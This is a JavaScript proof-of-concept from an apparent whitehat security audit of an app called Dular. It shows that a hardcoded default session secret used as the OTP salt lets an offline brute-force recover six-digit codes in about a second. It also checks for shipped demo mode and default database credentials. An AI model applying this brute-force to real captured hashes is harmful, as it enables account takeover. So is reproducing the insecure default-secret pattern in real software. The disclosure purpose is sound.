// ckb-whitehat PoC — Dular: F5 known SESSION_SECRET default
//
// config.js: `sessionSecret: process.env.SESSION_SECRET || 'dev-session-secret-change-me'`.
// utils.js hashOtp() = sha256(`${sessionSecret}:${phone}:${code}`). A deploy
// that forgets the env var uses the literal default as the OTP salt, so a
// captured (phone, code_hash) pair is brute-forceable offline in ~1M SHA-256.
// .env.example ships DEMO_MODE=true and DB creds postgres://dular:dular@…
//
// PoC: generate an OTP hash using the DEFAULT secret (the attacker's view:
// they know the code from OTP demo mode or observe it), then show a
// 6-digit brute-force recovers it in <1s.

import { createHash } from 'node:crypto'

const line = (t) => console.log('\n=== ' + t + ' ===')
const main = async () => {
  line('F5 — SESSION_SECRET default is a known OTP salt')
  const DEFAULT = 'dev-session-secret-change-me'
  const phone = '+254700000004'
  const targetCode = String(100000 + (234 * 1000 + 567)) // 334567, a sample 6-digit code
  const hash = createHash('sha256').update(`${DEFAULT}:${phone}:${targetCode}`).digest('hex')
  console.log(`default secret = ${JSON.stringify(DEFAULT)} (config.js fallback)`)
  console.log(`sample OTP hash (sha256 of default:phone:code) = ${hash}`)

  // Brute-force the full 900k 6-digit codespace (100000..999999)
  let t0 = performance.now()
  let found = null
  for (let code = 100000; code <= 999999; code++) {
    if (createHash('sha256').update(`${DEFAULT}:${phone}:${code}`).digest('hex') === hash) { found = code; break }
  }
  const t1 = performance.now()
  console.log(`brute-forced code ${found} in ${((t1 - t0) / 1000).toFixed(2)} s (900,000-keyspace, pure Node crypto)`)
  const fired = found === Number(targetCode)
  console.log(fired
    ? 'F5 FIRED: any deploy without a real SESSION_SECRET exposes all OTPs to a <2s offline brute-force'
    : 'expected brute-force recovery — inspect above')

  // also demonstrate .env.example ships DEMO_MODE=true
  const envExample = await import('node:fs/promises').then((m) => m.default.readFile((process.env.DULAR_DIR || '/tmp/ckb-whitehat/dular') + '/.env.example', 'utf8'))
  console.log('.env.example ships DEMO_MODE=true:', /DEMO_MODE=true/.test(envExample),
    '| DB creds postgres://dular:dular@ present:', /postgres:\/\/dular:dular@/.test(envExample))
  process.exit(fired ? 0 : 1)
}
main().catch((e) => { console.error('F5 PoC error:', e); process.exit(2) })
